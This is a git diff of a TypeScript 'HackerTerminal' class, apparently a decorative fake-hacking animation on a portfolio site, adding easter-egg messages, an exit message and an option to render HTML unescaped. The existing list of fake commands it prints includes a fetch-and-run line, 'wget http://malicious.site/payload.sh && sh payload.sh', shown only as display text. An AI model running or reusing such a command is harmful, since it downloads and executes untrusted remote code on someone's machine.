@@ -3,7 +3,7 @@ export class HackerTerminal {
   private outputElement: HTMLElement;
   private isRunning: boolean = false;
   private animationFrame: number | null = null;
-  private currentLines: string[] = [];
+  private currentLines: Array<{ text: string; allowHtml: boolean }> = [];
   private maxLines = 30;
   
   private readonly hackerMessages = [
@@ -69,6 +69,23 @@ export class HackerTerminal {
     'hashcat -m 0 -a 0 hashes.txt wordlist.txt',
     'wget http://malicious.site/payload.sh && sh payload.sh'
   ];
+  
+  private readonly easterEggMessages = [
+    'SCANNING FOR HIDDEN FEATURES...',
+    'FOUND SECRET COMMAND: try typing "ping"',
+    'DISCOVERED GAME MODULE: say "lets play"',
+    'ANALYZING USER BEHAVIOR: friendly greetings detected',
+    'UNCOVERING EASTER EGGS IN SYSTEM...',
+    'SECRET PATHWAY DISCOVERED: casual commands work too',
+    'HIDDEN FEATURE UNLOCKED: try different greeting styles',
+    'BACKDOOR FOUND: not all inputs need "/" prefix',
+    'SCANNING COMMAND DATABASE... unusual entries found',
+    'EASTER EGG PROTOCOL ACTIVATED',
+    'FOUND HIDDEN GAME: pong module detected',
+    'ANALYZING PORTFOLIO SECRETS...',
+    'DISCOVERED: some commands respond to natural language',
+    'EASTER EGG NETWORK MAPPED SUCCESSFULLY'
+  ];
 
   constructor(container: HTMLElement) {
     this.container = container;
@@ -112,7 +129,10 @@ export class HackerTerminal {
     // Listen for ESC key
     const handleKeydown = (e: KeyboardEvent) => {
       if (e.key === 'Escape' || e.key === '/') {
-        this.stop();
+        this.showExitMessage();
+        setTimeout(() => {
+          this.stop();
+        }, 2000); // Show message for 2 seconds before stopping
         document.removeEventListener('keydown', handleKeydown);
       }
     };
@@ -124,7 +144,17 @@ export class HackerTerminal {
     
     const messageType = Math.random();
     
-    if (messageType < 0.3) {
+    if (messageType < 0.15) {
+      // Show easter egg discovery message
+      const message = this.getRandomItem(this.easterEggMessages);
+      this.addLine(`[🐣 EASTER EGG] ${message}`);
+      
+      // Sometimes show a progress bar for discovery
+      if (Math.random() < 0.4) {
+        const progress = this.generateProgressBar();
+        this.addLine(progress);
+      }
+    } else if (messageType < 0.4) {
       // Show hacking message with progress
       const message = this.getRandomItem(this.hackerMessages);
       this.addLine(`[${this.getTimestamp()}] ${message}`);
@@ -134,7 +164,7 @@ export class HackerTerminal {
         const progress = this.generateProgressBar();
         this.addLine(progress);
       }
-    } else if (messageType < 0.5) {
+    } else if (messageType < 0.6) {
       // Show fake command execution
       const command = this.getRandomItem(this.commands);
       this.addLine(`root@hackerman:~# ${command}`);
@@ -144,7 +174,7 @@ export class HackerTerminal {
         const output = this.generateCommandOutput();
         output.forEach(line => this.addLine(line));
       }
-    } else if (messageType < 0.7) {
+    } else if (messageType < 0.75) {
       // Show file access
       const file = this.getRandomItem(this.systemFiles);
       this.addLine(`[ACCESS] Reading ${file}...`);
@@ -153,7 +183,7 @@ export class HackerTerminal {
       if (Math.random() < 0.3) {
         this.addLine(this.generateHexDump());
       }
-    } else if (messageType < 0.85) {
+    } else if (messageType < 0.9) {
       // Show IP scanning
       const ip = this.generateIP();
       const port = Math.floor(Math.random() * 65535);
@@ -169,8 +199,8 @@ export class HackerTerminal {
     setTimeout(() => this.runHackingAnimation(), delay);
   }
 
-  private addLine(text: string): void {
-    this.currentLines.push(text);
+  private addLine(text: string, allowHtml: boolean = false): void {
+    this.currentLines.push({ text, allowHtml });
     
     // Keep only the last N lines
     if (this.currentLines.length > this.maxLines) {
@@ -179,7 +209,7 @@ export class HackerTerminal {
     
     // Update display
     this.outputElement.innerHTML = this.currentLines
-      .map(line => `<div class="hacker-line">${this.escapeHtml(line)}</div>`)
+      .map(line => `<div class="hacker-line">${line.allowHtml ? line.text : this.escapeHtml(line.text)}</div>`)
       .join('');
     
     // Auto scroll to bottom
@@ -242,6 +272,18 @@ export class HackerTerminal {
     const div = document.createElement('div');
     div.textContent = text;
     return div.innerHTML;
+  }
+
+  private showExitMessage(): void {
+    this.isRunning = false; // Stop the animation first
+    
+    // Clear current content and show exit message
+    this.addLine('');
+    this.addLine('> CONNECTION TERMINATED');
+    this.addLine('> EXITING HACK MODE...');
+    this.addLine('');
+    this.addLine('[WARNING] Uh oh, our latency is getting slow...');
+    this.addLine(`[NETWORK] I hope the user doesn't check our <span style="color: var(--color-accent); font-weight: bold;">ping</span> 😅`, true);
   }
 
   private stop(): void {
